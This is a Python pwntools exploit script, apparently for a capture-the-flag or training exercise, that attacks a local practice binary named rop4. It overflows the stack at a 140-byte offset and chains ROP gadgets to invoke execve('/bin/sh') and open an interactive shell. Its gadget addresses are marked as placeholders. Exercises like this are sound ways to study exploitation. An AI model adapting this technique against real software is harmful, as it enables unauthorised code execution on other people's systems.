from pwn import *
ov=b"a"*140
# p=process("./pwn/stack/rop-4/rop4")

# exe=0x08053AB0
# binsh=0x080CBF4F
# pay=ov+p32(exe)+p32(0xdeadbeef)+p32(binsh)+p32(binsh)+p32(0x0)
# p.sendline(pay)
# p.interactive()

from pwn import *

# Set the context for the target binary
context.binary = './pwn/stack/rop-4/rop4'
context.arch = 'i386'

# Load the ELF binary
e = ELF('./pwn/stack/rop-4/rop4')

# Start the process
p = process('./pwn/stack/rop-4/rop4')

offset = 140
print(f"Offset to EIP: {offset}")

# Step 2: Find '/bin/sh' address
bin_sh = next(e.search(b'/bin/sh'))
print(f"Address of '/bin/sh': {hex(bin_sh)}")

# Step 3: Define gadget addresses (Replace with actual addresses)
pop_eax_ret = 0x080b8536  # pop eax ; ret
pop_ebx_ret = 0x080481c9  # pop ebx ; ret
pop_ecx_ret = 0x080497f1  # pop ecx ; ret
pop_edx_ret = 0x0806f27a  # pop edx ; ret
int_0x80 = 0x08049a21     # int 0x80

# Step 4: Build the payload
payload = b'A' * offset
payload += p32(pop_eax_ret)
payload += p32(0xb)          # execve syscall number
payload += p32(pop_ebx_ret)
payload += p32(bin_sh)       # Address of '/bin/sh'
payload += p32(pop_ecx_ret)
payload += p32(0x0)          # NULL
payload += p32(pop_edx_ret)
payload += p32(0x0)          # NULL
payload += p32(int_0x80)     # Trigger the system call

# Step 5: Send the payload and get a shell
p = process('./pwn/stack/rop-4/rop4')
p.sendline(payload)
p.interactive()